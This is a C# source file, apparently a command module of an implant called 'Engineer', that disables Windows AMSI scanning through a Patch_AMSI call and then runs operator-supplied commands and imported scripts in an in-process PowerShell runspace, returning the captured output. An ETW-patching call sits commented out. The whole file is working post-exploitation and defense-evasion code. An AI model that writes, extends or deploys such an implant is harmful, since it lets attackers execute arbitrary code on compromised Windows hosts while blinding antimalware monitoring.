using Engineer.Commands;
using Engineer.Models;
using Engineer.Extra;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Host;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Globalization;
using Microsoft.Win32;

namespace Engineer.Commands
{
    internal class UnManagedPowershell : EngineerCommand
    {
        public override string Name => "UnManagedPowershell";

        public override string Execute(EngineerTask task)
        {
            var stdOut = Console.Out;
            var stdErr = Console.Error;
            try
            {
                //set the console out and error to try and capture output from thread execution
                var ms = new MemoryStream();

                // use Console.SetOut() to redirect the output to a string
                StreamWriter writer = new StreamWriter(ms) { AutoFlush = true };
                
                //get the current Processes Console and set the SetOut and SetError to the stream writer
                Console.SetOut(writer);
                Console.SetError(writer);

                //Patch_ETW patchetwObject = new Patch_ETW();
                //Console.WriteLine(patchetwObject.Execute(null));
                Patch_AMSI patchObject = new Patch_AMSI();
                var pathrespopnse = patchObject.Execute(null);
                pathrespopnse = pathrespopnse.Replace("error", "warning");
                Console.WriteLine(pathrespopnse);

                bool OutString = true;
                task.Arguments.TryGetValue("/command", out string command);

                
                //create a powershell object
                var ps = PowerShell.Create();
                //adds command and checks to the powershell object to get a good verbose output from the command
                if (PowershellImport.ImportedScripts.Count() > 0)
                {
                    foreach(var script in PowershellImport.ImportedScripts)
                    {
                        ps.AddScript(script.Value);
                    }

                }
                ps.AddScript(command);
                if (OutString)
                {
                    ps.AddCommand("Out-String");
                }
                PSDataCollection<object> results = new PSDataCollection<object>();
                ps.Streams.Error.DataAdded += (sender, e) =>
                {
                    foreach (ErrorRecord er in ps.Streams.Error.ReadAll())
                    {
                        results.Add(er);
                    }
                };
                ps.Streams.Verbose.DataAdded += (sender, e) =>
                {
                    foreach (VerboseRecord vr in ps.Streams.Verbose.ReadAll())
                    {
                        results.Add(vr);
                    }
                };
                ps.Streams.Debug.DataAdded += (sender, e) =>
                {
                    foreach (DebugRecord dr in ps.Streams.Debug.ReadAll())
                    {
                        results.Add(dr);
                    }
                };
                ps.Streams.Warning.DataAdded += (sender, e) =>
                {
                    foreach (WarningRecord wr in ps.Streams.Warning)
                    {
                        results.Add(wr);
                    }
                };
                
                ps.Invoke(null, results);
                writer.Flush();
                string output = Encoding.UTF8.GetString(ms.ToArray());
                output += string.Join(Environment.NewLine, results.Select(R => R.ToString()).ToArray());
                ps.Commands.Clear();
                ps.Dispose();

                return output;
            }
            catch (Exception ex)
            {
                return "error: " + ex.Message;
            }
            finally
            {
                //reset the console out and error
                Console.SetOut(stdOut);
                Console.SetError(stdErr);
            }
        }        
    }
}
